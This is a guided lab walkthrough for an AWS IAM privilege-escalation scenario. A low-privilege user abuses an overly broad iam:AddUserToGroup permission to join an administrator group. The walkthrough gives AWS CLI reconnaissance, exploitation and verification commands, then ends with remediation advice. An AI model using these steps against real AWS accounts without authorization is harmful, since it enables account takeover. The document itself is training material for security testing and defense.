# Guided Walkthrough: Self-Escalation via iam:AddUserToGroup

This scenario demonstrates a privilege escalation vulnerability where a user has permission to add themselves to an administrative group. The attacker can use the `iam:AddUserToGroup` permission to add themselves to a group with `AdministratorAccess`, thereby gaining full administrator permissions.

This is a particularly dangerous misconfiguration because it allows for self-escalation with a single API call. The vulnerability often occurs when administrators grant users the ability to manage group memberships without proper resource constraints, inadvertently allowing users to add themselves to privileged groups.

In real environments this pattern shows up when a platform or ops team wants to let users self-service their group memberships for non-sensitive groups, but the policy is written too broadly — leaving administrative groups within scope of the same permission.

## The Challenge

You start with credentials for `pl-prod-iam-013-to-admin-user`, a low-privilege IAM user. Your goal is to reach full administrator access in the AWS account.

The user has a single noteworthy permission: `iam:AddUserToGroup` on `*`. Somewhere in the account there is an IAM group with `AdministratorAccess` attached. If you can find it and add yourself to it, you win.

- **Start:** `arn:aws:iam::{account_id}:user/pl-prod-iam-013-to-admin-user`
- **Destination:** `arn:aws:iam::{account_id}:group/pl-prod-iam-013-to-admin-group`

## Reconnaissance

First, confirm who you are and establish a baseline of your current permissions:

```bash
export AWS_ACCESS_KEY_ID="<starting_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<starting_secret_access_key>"
unset AWS_SESSION_TOKEN

aws sts get-caller-identity --query 'Arn' --output text
```

You should see `arn:aws:iam::{account_id}:user/pl-prod-iam-013-to-admin-user`. Now confirm that you do not currently have admin access:

```bash
aws iam list-users --max-items 1
```

This should fail with an `AccessDenied` error — you have no admin permissions yet.

Next, enumerate the IAM groups in the account. With `iam:ListGroups` you can discover candidate targets:

```bash
aws iam list-groups --query 'Groups[*].GroupName' --output text
```

Look for groups with names suggesting elevated permissions (e.g., "admin", "administrators", "superusers"). Then check what policies are attached to a suspect group:

```bash
aws iam list-attached-group-policies --group-name pl-prod-iam-013-to-admin-group
```

This reveals that `pl-prod-iam-013-to-admin-group` has the `AdministratorAccess` managed policy attached. That is your target.

## Exploitation

With reconnaissance complete, the actual exploitation is a single API call. Add yourself to the admin group:

```bash
aws iam add-user-to-group \
    --group-name pl-prod-iam-013-to-admin-group \
    --user-name pl-prod-iam-013-to-admin-user
```

The call returns no output on success. IAM group membership takes effect immediately, but policy propagation through the IAM evaluation engine can take up to 15 seconds. Wait a moment before testing.

## Verification

After waiting for propagation, confirm you now have administrative access:

```bash
aws iam list-users --max-items 3 --output table
```

This time the call succeeds. You can also confirm your group membership directly:

```bash
aws iam list-groups-for-user \
    --user-name pl-prod-iam-013-to-admin-user \
    --query 'Groups[*].GroupName' \
    --output text
```

You should see `pl-prod-iam-013-to-admin-group` in the output.

## What Happened

You exploited a self-escalation vulnerability using a single `iam:AddUserToGroup` API call. The overly broad permission allowed you to add yourself to any group in the account — including one with `AdministratorAccess`. Once your user was a group member, you inherited all policies attached to that group.

This is a common finding in AWS environments where IAM policies are written without proper resource constraints. The fix is straightforward: scope `iam:AddUserToGroup` to specific non-privileged group ARNs using the `iam:ResourceTag` condition or explicit ARN allow-lists, and use SCPs to prevent adding users to groups with administrative policies. In practice, self-service group membership management should never extend to groups with elevated permissions.
